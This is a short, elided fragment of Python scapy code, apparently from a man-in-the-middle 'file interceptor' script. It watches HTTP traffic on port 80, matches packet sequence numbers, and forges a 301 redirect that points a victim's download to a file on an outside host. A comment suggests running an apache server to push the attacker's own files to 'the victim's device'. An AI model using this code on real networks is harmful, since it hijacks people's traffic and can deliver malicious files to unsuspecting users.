        ...
        if scapy_packet[scapy.TCP]:
            if scapy_packet[scapy.TCP].dport == 80:
                ...
                if scapy_packet[scapy.TCP].seq in ack_list:
                    ...
                    #Incase of URL you can also start apache server and send and files from your device to the victim's device
                    url = "HTTP /1.1 301 Moved Permanently\nLocation: https://elmayorportaldegerencia.com/Musica/Audios/Ace%20of%20Base/Dont%20Turn%20Around.mp3\n\n"
